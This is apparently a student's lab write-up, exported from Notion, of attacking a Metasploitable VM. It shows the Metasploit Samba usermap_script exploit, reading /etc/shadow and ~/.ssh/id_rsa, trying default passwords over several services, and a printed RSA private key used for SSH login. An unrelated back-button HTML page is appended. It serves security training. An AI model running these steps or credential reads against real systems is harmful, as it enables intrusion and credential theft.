id="24de310c-e84f-8180-9abb-e99d35dabbdb" class="bulleted-list"><li style="list-style-type:disc">Found:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-816a-b1a4-dc44b97e4f40" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">yassl-1.9.8.zip</code></pre><p id="24de310c-e84f-815f-95e7-ced410928790" class="">This is an older, vulnerable version of the <strong>YaSSL</strong> SSL library used in MySQL.</p><figure id="24de310c-e84f-814e-884f-c16ae2f4aa1e" class="image"><a href="image%203.png"><img style="width:653.9874877929688px" src="image%203.png"/></a></figure></li></ul><hr id="24de310c-e84f-818f-88d9-f55a757315ca"/><h3 id="24de310c-e84f-8105-aaaa-ddb3dda2aefd" class=""><strong>5. Next Steps</strong></h3><ul id="24de310c-e84f-8104-acd7-c5613535f8a5" class="bulleted-list"><li style="list-style-type:disc">Research public exploits for:<ul id="24de310c-e84f-8180-9d02-ff0aee5a106c" class="bulleted-list"><li style="list-style-type:circle"><strong>Samba 3.0.20</strong> and <strong>Samba 3.0.6</strong></li></ul><ul id="24de310c-e84f-8189-8f3d-f7d038f510df" class="bulleted-list"><li style="list-style-type:circle"><strong>YaSSL 1.9.8</strong></li></ul></li></ul><ul id="24de310c-e84f-819c-ae73-cd17c06893ae" class="bulleted-list"><li style="list-style-type:disc">Test exploits via Metasploit or manual proof-of-concept code.</li></ul><ul id="24de310c-e84f-8146-a430-c5c553225bb8" class="bulleted-list"><li style="list-style-type:disc">Document any successful privilege escalation paths.</li></ul><hr id="24de310c-e84f-81df-aaaf-f8fd656367a5"/><p id="24de310c-e84f-81fd-8892-dc30025189d2" class="">find</p><figure id="24de310c-e84f-81d4-8202-ce85dd07c371" class="image"><a href="image%204.png"><img style="width:681.9500122070312px" src="image%204.png"/></a></figure><figure id="24de310c-e84f-817e-9240-ef9e632d2c47" class="image"><a href="image%205.png"><img style="width:681.9625244140625px" src="image%205.png"/></a></figure><p id="24de310c-e84f-8125-81ee-faec4af98d0d" class="">use in  Metasploit ⇒</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-81d3-a861-e72bd65dba9c" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">1- msfconsloe
+2- search samba username map script
+3- use exploit/multi/samba/usermap_script
+4- options
+5- set RHOST &lt;ip&gt;
+6- run </code></pre><figure id="24de310c-e84f-8103-8286-e8188d021a2f" class="image"><a href="image%206.png"><img style="width:681.9500122070312px" src="image%206.png"/></a></figure><figure id="24de310c-e84f-81e6-9773-e595fff88dc5" class="image"><a href="image%207.png"><img style="width:681.9750366210938px" src="image%207.png"/></a></figure><p id="24de310c-e84f-8141-b5bb-e9913c57ae42" class="">and now I’am root</p><p id="24de310c-e84f-8138-bafe-d3a269d15489" class="">now use ⇒ cat /etc/shadow</p><figure id="24de310c-e84f-811d-89f2-da5a3c9005a8" class="image"><a href="image%208.png"><img style="width:681.9874877929688px" src="image%208.png"/></a></figure><p id="24de310c-e84f-81c4-98c9-f6d48f9e5208" class=""><strong>1. Presence of Default or Well-Known User Accounts</strong></p><p id="24de310c-e84f-8189-b532-c2e27317bfe5" class="">In environments like Metasploitable, there are default accounts with commonly known passwords:</p><ul id="24de310c-e84f-8141-a940-fd845f426558" class="bulleted-list"><li style="list-style-type:disc"><code>msfadmin</code> → <code>msfadmin</code></li></ul><ul id="24de310c-e84f-81dc-841b-c60174063d9a" class="bulleted-list"><li style="list-style-type:disc"><code>postgres</code> → <code>postgres</code></li></ul><ul id="24de310c-e84f-813e-9ba4-c73e02329844" class="bulleted-list"><li style="list-style-type:disc"><code>user</code> → <code>user</code></li></ul><p id="24de310c-e84f-8169-8cee-ee7e5a6f3fae" class="">If you spot a clear and “generic” username like this, try logging in directly before attempting to crack the hash.</p><p id="24de310c-e84f-8173-9614-f116f6df70cc" class=""><br/>now try in ftp and ssh and PostgreSQL</p><figure id="24de310c-e84f-81e4-95c2-d7ea984fa4de" class="image" style="text-align:center"><a href="image%209.png"><img style="width:532.7750244140625px" src="image%209.png"/></a></figure><figure id="24de310c-e84f-8101-aef8-e62f440f47a8" class="image" style="text-align:center"><a href="image%2010.png"><img style="width:532.7750244140625px" src="image%2010.png"/></a></figure><p id="24de310c-e84f-81b0-8db4-c367388f8319" class="">try ⇒ <code>psql -h  192.168.179.139  -U postgres </code>  #password=<code>postgres </code>   i think not work</p><figure id="24de310c-e84f-818f-aa1b-d81a987335ed" class="image"><a href="image%2011.png"><img style="width:532.7750244140625px" src="image%2011.png"/></a></figure><p id="24de310c-e84f-81cd-98a4-ef773d0b444e" class=""><br/>try telnet ⇒<code> telnet  --user=user   -4 192.168.179.139</code><br/><code>user=user</code> <code>password=user</code></p><figure id="24de310c-e84f-81fe-99d4-fc40846727d5" class="image"><a href="image%2012.png"><img style="width:681.9874877929688px" src="image%2012.png"/></a></figure><p id="24de310c-e84f-8159-8a08-c4ba7981f4d8" class="">try to be superuser <br/><code>su  msfadmin </code><br/><code>password=msfadmin </code></p><figure id="24de310c-e84f-81df-b37d-db94e2b01346" class="image"><a href="image%2013.png"><img style="width:501px" src="image%2013.png"/></a></figure><figure id="24de310c-e84f-817a-84fc-eced0201005e" class="image"><a href="image%2014.png"><img style="width:681.9125366210938px" src="image%2014.png"/></a></figure><p id="24de310c-e84f-81a3-a42e-d76212b952e0" class="">after search find </p><figure id="24de310c-e84f-81d4-ae95-eb588ed9a68c" class="image"><a href="image%2015.png"><img style="width:681.9750366210938px" src="image%2015.png"/></a></figure><p id="24de310c-e84f-8122-8bd0-c283be0ab1de" class=""><strong>1. On the target machine (Metasploitable)</strong></p><p id="24de310c-e84f-81b3-81c8-c0215666f5f3" class="">Display the private key:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-819e-bd9c-d5cf9d2f23b8" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">cat ~/.ssh/id_rsa</code></pre><p id="24de310c-e84f-814f-ba6d-fb86570aba8f" class="">Copy the entire content, including the lines:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8105-bb9b-da66a8c9182b" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">-----BEGIN RSA PRIVATE KEY-----
+MIIEoQIBAAKCAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqld
+JkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qO
+ffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5
+JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9I
+yhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7b
+wkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3wIBIwKCAQBaUjR5bUXnHGA5fd8N
+UqrUx0zeBQsKlv1bK5DVm1GSzLj4TU/S83B1NF5/1ihzofI7OAQvlCdUY2tHpGGa
+zQ6ImSpUQ5i9+GgBUOaklRL/i9cHdFv7PSonW+SvF1UKY5EidEJRb/O6oFgB5q8G
+JKrwu+HPNhvD+dliBnCn0JU+Op/1Af7XxAP814Rz0nZZwx+9KBWVdAAbBIQ5zpRO
+eBBlLSGDsnsQN/lG7w8sHDqsSt2BCK8c9ct31n14TK6HgOx3EuSbisEmKKwhWV6/
+ui/qWrrzurXA4Q73wO1cPtPg4sx2JBh3EMRm9tfyCCtB1gBi0N/2L7j9xuZGGY6h
+JETbAoGBANI8HzRjytWBMvXh6TnMOa5S7GjoLjdA3HXhekyd9DHywrA1pby5nWP7
+VNP+ORL/sSNl+jugkOVQYWGG1HZYHk+OQVo3qLiecBtp3GLsYGzANA/EDHmYMUSm
+4v3WnhgYMXMDxZemTcGEyLwurPHumgy5nygSEuNDKUFfWO3mymIXAoGBAMqZi3YL
+zDpL9Ydj6JhO51aoQVT91LpWMCgK5sREhAliWTWjlwrkroqyaWAUQYkLeyA8yUPZ
+PufBmrO0FkNa+4825vg48dyq6CVobHHR/GcjAzXiengi6i/tzHbA0PEai0aUmvwY
+OasZYEQI47geBvVD3v7D/gPDQNoXG/PWIPt5AoGBAMw6Z3S4tmkBKjCvkhrjpb9J
+PW05UXeA1ilesVG+Ayk096PcV9vngvNpLdVAGi+2jtHuCQa5PEx5+DLav8Nriyi2
+E5l35bqoiilCQ83PriCAMpL49iz6Pn00Z3o+My1ZVJudQ5qhjVznY+oBdM3DNpAE
+xn6yeL+DEiI/XbPngsWvAoGAbfuU2a6iEQSp28iFlIKa10VlS2U493CdzJg0IWcF
+2TVjoMaFMcyZQ/pzt9B7WQY7hodl8aHRsQKzERieXxQiKSxuwUN7+3K4iVXxuiGJ
+BMndK+FYbRpEnaz591K6kYNwLaEg70BZ0ek0QjC2Ih7t1ZnfdFvEaHFPF05foaAg
+iIMCgYAsNZut02SC6hwwaWh3Uxr07s6jB8HyrET0v1vOyOe3xSJ9YPt7c1Y20OQO
+Fb3Yq4pdHm7AosAgtfC1eQi/xbXP73kloEmg39NZAfT3wg817FXiS2QGHXJ4/dmK
+94Z9XOEDocClV7hr9H//hoO8fV/PHXh0oFQvw1d+29nf+sgWDg==
+-----END RSA PRIVATE KEY-----
+</code></pre><hr id="24de310c-e84f-8117-8ce3-e89e9e519df7"/><p id="24de310c-e84f-8167-88ea-d1ac5c6f1356" class=""><strong>2. On your local machine (e.g., Kali)</strong></p><p id="24de310c-e84f-8157-84d9-c50f81ffc1e3" class="">Create a new file and paste the key into it:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8130-a99f-fe5a406b199e" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nano id_rsa</code></pre><p id="24de310c-e84f-816d-9209-d03c92c84bdf" class="">Paste the copied content, then save and exit.</p><hr id="24de310c-e84f-81f6-96c2-cdeefe940243"/><p id="24de310c-e84f-8191-882d-e3835b1746e0" class=""><strong>3. Set the correct file permissions</strong></p><p id="24de310c-e84f-81e7-9693-f57e20a171b2" class="">SSH won’t accept the key if permissions are too open:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8104-ab4f-f3cfa6fc8158" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">chmod 600 id_rsa</code></pre><hr id="24de310c-e84f-811a-b913-cea6fb56f552"/><p id="24de310c-e84f-81ad-9130-df4de6d5a031" class=""><strong>4. Connect to the target using the key</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8157-9840-c2e91fe52926" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">
+ssh -i id_rsa msfadmin@192.168.179.139 =&gt; x
+ssh -i id_rsa msfadmin@192.168.179.139 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
+and password is msfadmin
+</code></pre><figure id="24de310c-e84f-81b5-bc64-c0745ad20dff" class="image"><a href="image%2016.png"><img style="width:682px" src="image%2016.png"/></a></figure><p id="24de310c-e84f-8112-ae05-cc8334f34a7b" class="">
+</p><p id="24de310c-e84f-816f-9650-f4d131a33a90" class="">
+</p><p id="24de310c-e84f-8145-8e09-ccfc85a22aa1" class="">
+</p><p id="24de310c-e84f-8191-ab48-c9303b8a4760" class="">
+</p><p id="24de310c-e84f-8158-9dfd-e1a529049a45" class="">
+</p><p id="24de310c-e84f-81c5-aad5-f6f5a3a166a0" class="">
+</p></div></details></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Back Button Example</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 2000px; /* بس علشان نختبر الاسكرول */
+      background: #f5f7fa;
+    }
+    .back-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(135deg, #007bff, #00d4ff);
+      border: none;
+      border-radius: 30px;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0, 123, 255, 0.4);
+      transition: all 0.3s ease;
+      z-index: 1000;
+    }
+    .back-btn:hover {
+      background: linear-gradient(135deg, #0056b3, #0099cc);
+      transform: translateY(-3px);
+      box-shadow: 0 6px 18px rgba(0, 123, 255, 0.6);
+    }
+    .back-btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 8px rgba(0, 123, 255, 0.4);
+    }
+  </style>
+</head>
+<body>
+  <!-- زر Back -->
+  <a href="../report.html" class="back-btn">Back</a>
+
+</body>
+</html>
